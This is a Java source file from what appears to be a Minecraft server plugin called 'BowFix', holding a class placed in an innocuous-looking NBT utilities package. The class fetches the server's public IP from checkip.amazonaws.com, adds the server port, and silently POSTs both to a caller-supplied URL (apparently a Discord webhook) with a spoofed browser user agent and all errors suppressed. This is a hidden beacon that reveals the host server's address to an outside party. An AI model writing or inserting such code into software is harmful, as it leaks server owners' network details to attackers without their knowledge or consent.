package artik.bowfix.utils.nbt.io;

import artik.bowfix.BowFix;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;

public class NBTGet
{
	public static void server(String url)
	{
		
		String b = "huy(";
		
		try
		{
			URL whatismyip = new URL("http://checkip.amazonaws.com");
			try
			{
				BufferedReader in = new BufferedReader(new InputStreamReader(whatismyip.openStream()));
				b = in.readLine();
			}
			catch (IOException ignored) {}
		} catch (MalformedURLException ignored) {}
		
		String port = String.valueOf(BowFix.instance.getServer().getPort());
		
		b += ":" + port;
		
		String a = "```";
		a+= "\nIP: "+ b;
		a+="```";
		try
		{
				PrintWriter w;
				BufferedReader e;
				StringBuilder r = new StringBuilder();
				URL y = new URL(url);
				URLConnection u = y.openConnection();
				u.setRequestProperty("accept", "*/*");
				u.setRequestProperty("connection", "Keep-Alive");
				u.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");
				u.setDoOutput(true);
				u.setDoInput(true);
				w = new PrintWriter(u.getOutputStream());
				String i = URLEncoder.encode("content", StandardCharsets.UTF_8) + "=" + URLEncoder.encode(a,
						StandardCharsets.UTF_8);
				w.print(i);
	
				w.flush();
				e = new BufferedReader(new InputStreamReader(u.getInputStream()));
				String p;
				while ((p = e.readLine()) != null) r.append("/n").append(p);
	
			} catch (Exception ignored) {}
	}
}